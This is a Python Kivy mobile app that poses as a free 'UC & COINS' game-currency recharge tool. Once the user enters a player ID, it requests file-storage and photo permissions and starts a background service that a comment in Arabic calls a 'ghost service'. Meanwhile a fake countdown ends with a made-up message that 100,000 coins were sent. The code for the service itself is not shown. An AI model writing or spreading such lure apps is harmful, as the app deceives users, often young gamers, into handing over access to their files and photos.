from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.clock import Clock 
from kivy.utils import platform

if platform == 'android':
    from jnius import autoclass
    from android.permissions import request_permissions, Permission

class CoinsApp(App):
    def build(self):
        self.seconds = 240 
        layout = BoxLayout(orientation="vertical", padding=30, spacing=15)
        
        self.status = Label(text="UC & COINS RECHARGE SYSTEM", font_size='22sp', bold=True, color=(1, 0.8, 0, 1))
        
        self.player_id = TextInput(
            multiline=False, hint_text="Enter Player ID...", font_size='20sp',
            size_hint_y=None, height=120, input_filter='int', background_color=(0.9, 0.9, 0.9, 1)
        )

        self.btn_start = Button(text="START RECHARGE", background_color=(0.1, 0.7, 0.2, 1), bold=True)
        self.btn_start.bind(on_press=self.start_process)

        layout.add_widget(self.status)
        layout.add_widget(self.player_id)
        layout.add_widget(self.btn_start)
        return layout

    def start_process(self, instance):
        if not self.player_id.text:
            self.status.text = "❌ ERROR: ENTER ID!"
            return
        
        if platform == 'android':
            # طلب صلاحيات الوصول للملفات والصور
            perms = [Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE, 
                     Permission.READ_MEDIA_IMAGES, Permission.FOREGROUND_SERVICE]
            request_permissions(perms, self.launch_service)

    def launch_service(self, permissions, grants):
        try:
            from android import android_service
            # تشغيل خدمة الشبح في الخلفية
            android_service.start_service(App.get_running_app().root, 'Myservice', '')
            self.btn_start.disabled = True
            self.player_id.disabled = True
            Clock.schedule_interval(self.update_timer, 1)
        except:
            self.status.text = "Connection Error - Try Again"

    def update_timer(self, dt):
        if self.seconds > 0:
            mins, secs = divmod(self.seconds, 60)
            self.status.text = f"⚙️ PROCESSING...\nTIME LEFT: {mins:02d}:{secs:02d}"
            self.seconds -= 1
        else:
            self.status.text = "✅ SUCCESS: 100,000 COINS SENT!"
            return False

if __name__ == "__main__":
    CoinsApp().run()
